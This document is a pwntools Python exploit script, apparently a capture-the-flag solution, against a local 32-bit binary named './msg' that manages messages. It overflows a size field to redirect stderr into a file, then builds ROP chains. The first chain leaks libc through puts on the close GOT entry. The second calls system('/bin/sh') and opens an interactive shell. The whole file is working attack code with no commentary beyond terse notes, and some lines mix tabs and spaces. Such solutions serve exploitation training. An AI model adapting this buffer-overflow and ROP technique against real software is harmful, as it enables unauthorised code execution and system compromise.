from pwn import *

context.log_level='debug'

def New(msg,until=False):

	fn=''

	s.recvuntil('4. Exit')
	s.sendline('1')
	
	if until is not False:
		s.recvuntil(until)
		fn=s.recvuntil('\n')[:-1]

	s.recvuntil('msg:')
	s.send(msg)

	return fn

def Change(id,msg):

        s.recvuntil('4. Exit')
        s.sendline('2')
	s.recvuntil('Input msg ID :')
	s.sendline(id)
	s.recvuntil('msg:')
	s.sendline(msg)

def Load(id,until=False):

        s.recvuntil('4. Exit')
        s.sendline('3')
        s.recvuntil('Input msg ID :')
        s.sendline(id)

        if until is not False:
                s.recvuntil(until)


if __name__ == "__main__":

	binary='./msg'
	s=process('./msg')

	e=ELF(binary)
	l=ELF('/lib/i386-linux-gnu/libc.so.6')

	rop=ROP(binary)

	pppr=0x08048e39
	pr=0x080485ad
	main_ret=0x08048dca

	fn1=''
	fn2=''
	fn3=''
	fn4=''

	raw_input('***********Libc leak**************')


	#open 3 close 2
	fn1=New('A'*0xfc+p32(0x2),'Msg ID : ') #size overflow!! => stderr
	
	
	#open 2 close 4 
	#stderr file descripter is 2, fn2 is stderr file name!!
	fn2=New('B'*0xfc+p32(0x4),'Msg ID : ') 


	Load('#'*0x50) #stderr <- "This is ..."
	Load('/'*0x50)

	payload=p32(e.bss()) #vaild address!!
	payload+=p32(e.plt['puts'])
	payload+=p32(main_ret)
	payload+=p32(e.got['close'])

	Load('!'*0x1+'!'*0x4+payload)
	Load(fn2,until='\xff\x03\n')

	close_libc= u32(s.recv(4))
	system_libc=close_libc-0x9b4f0
	libc_base=close_libc-0xd6290

	raw_input('************Attack**************')

	#open 4 close 2
	fn3=New('C'*0xfc+p32(0x2)) 
	
	#open 2 close 4
	fn4=New('D'*0xfc+p32(0x4),'Msg ID : ')

        Load('#'*0x50) #stderr <- "This is ..."
        Load('/'*0x50)

        payload=p32(e.bss()) #vaild address!!
        payload+=p32(system_libc)
        payload+=p32(main_ret)
        payload+=p32(libc_base+list(l.search('/bin/sh\x00'))[0])

        Load('!'*0x1+'!'*0x4+payload)
	Load(fn4)
	
	s.interactive()

